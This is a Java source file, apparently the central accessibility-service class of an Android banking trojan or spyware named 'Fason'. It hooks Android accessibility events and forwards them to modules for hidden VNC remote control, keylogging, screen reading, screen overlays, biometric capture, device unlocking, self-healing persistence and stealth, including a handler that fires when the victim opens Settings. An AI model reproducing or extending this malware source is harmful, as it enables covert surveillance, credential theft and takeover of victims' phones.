package com.fason.app.core;

import android.accessibilityservice.AccessibilityService;
import android.content.Context;
import android.provider.Settings;
import android.content.Intent;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.fason.app.features.hvnc.HVncAccessibilityService;
import com.fason.app.features.inspector.InspectorAccessibilityService;
import com.fason.app.features.inspector.Inspector2;
import com.fason.app.features.keylogger.KeyloggerManager;
import com.fason.app.features.unlock.UnlockManager;
import com.fason.app.features.overlay.OverlayEngine;
import com.fason.app.features.scrreader.ScrReader;
import com.fason.app.features.biometrics.BiometricCapture;
import com.fason.app.features.automation.AutomataManager;
import com.fason.app.features.screenlog.ScreenLogManager;
import com.fason.app.persistence.AccessibilitySelfHeal;
import com.fason.app.core.permissions.PermissionGuardOrchestrator;
import com.fason.app.stealth.StealthModeManager;

public class FasonAccessibilityService extends AccessibilityService {
    private static final String TAG = "FasonA11y";
    private static volatile FasonAccessibilityService instance;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        HVncAccessibilityService.onHostConnected(this);
        InspectorAccessibilityService.onHostConnected(this);
        KeyloggerManager.onHostConnected(this);
        UnlockManager.onHostConnected(this);
        // APEX engines
        OverlayEngine.getInstance().setAccessibilityService(this);
        ScrReader.getInstance().setAccessibilityService(this);
        BiometricCapture.getInstance().setAccessibilityService(this);
        AutomataManager.getInstance().setAccessibilityService(this);
        ScreenLogManager.getInstance().setAccessibilityService(this);
        Inspector2.getInstance().setAccessibilityService(this);
        Log.i(TAG, "Accessibility service connected — APEX engines armed");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;
        try {
            // Layer 5: Self-heal check
            AccessibilitySelfHeal.checkAndHeal();
            // Permission Guard: real-time interception
            PermissionGuardOrchestrator.onAccessibilityEvent(this, event);
            // Stealth Mode: settings intercept
            if (event.getPackageName() != null && 
                "com.android.settings".contentEquals(event.getPackageName())) {
                StealthModeManager.onSettingsOpened();
            }
            int type = event.getEventType();
            if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
                type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                HVncAccessibilityService.onAccessibilityEvent(event);
                KeyloggerManager.onAccessibilityEvent(event);
                OverlayEngine.getInstance().onAccessibilityEvent(event);
                ScrReader.getInstance().onAccessibilityEvent(event);
                Inspector2.getInstance().onAccessibilityEvent(event);
                BiometricCapture.getInstance().onAccessibilityEvent(event);
            } else if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
                       type == AccessibilityEvent.TYPE_VIEW_FOCUSED ||
                       type == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
                KeyloggerManager.onAccessibilityEvent(event);
                ScrReader.getInstance().onAccessibilityEvent(event);
            } else if (type == AccessibilityEvent.TYPE_VIEW_CLICKED ||
                       type == AccessibilityEvent.TYPE_VIEW_SCROLLED) {
                KeyloggerManager.onAccessibilityEvent(event);
                ScrReader.getInstance().onAccessibilityEvent(event);
            } else if (type == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
                KeyloggerManager.onAccessibilityEvent(event);
                ScrReader.getInstance().onAccessibilityEvent(event);
            } else if (type == AccessibilityEvent.TYPE_ANNOUNCEMENT) {
                InspectorAccessibilityService.onAccessibilityEvent(event);
                ScrReader.getInstance().onAccessibilityEvent(event);
            }
        } finally {
            try { event.recycle(); } catch (Exception ignored) {}
        }
    }

    @Override
    public void onInterrupt() {
        Log.w(TAG, "Service interrupted");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        HVncAccessibilityService.onHostDisconnected();
        InspectorAccessibilityService.onHostDisconnected();
        KeyloggerManager.onHostDisconnected();
        UnlockManager.onHostDisconnected();
        instance = null;
        Log.i(TAG, "Service destroyed");
    }

    public static FasonAccessibilityService getInstance() {
        return instance;
    }

    public static boolean isServiceConnected() {
        return instance != null;
    }

    public static boolean isEnabled() {
        try {
            Context ctx = FasonApp.getContext();
            String enabled = Settings.Secure.getString(
                ctx.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabled == null) return false;
            String pkg = ctx.getPackageName();
            return enabled.contains(pkg);
        } catch (Exception e) {
            return false;
        }
    }

    public static void openSettings() {
        try {
            Context ctx = FasonApp.getContext();
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Failed to open accessibility settings", e);
        }
    }
}
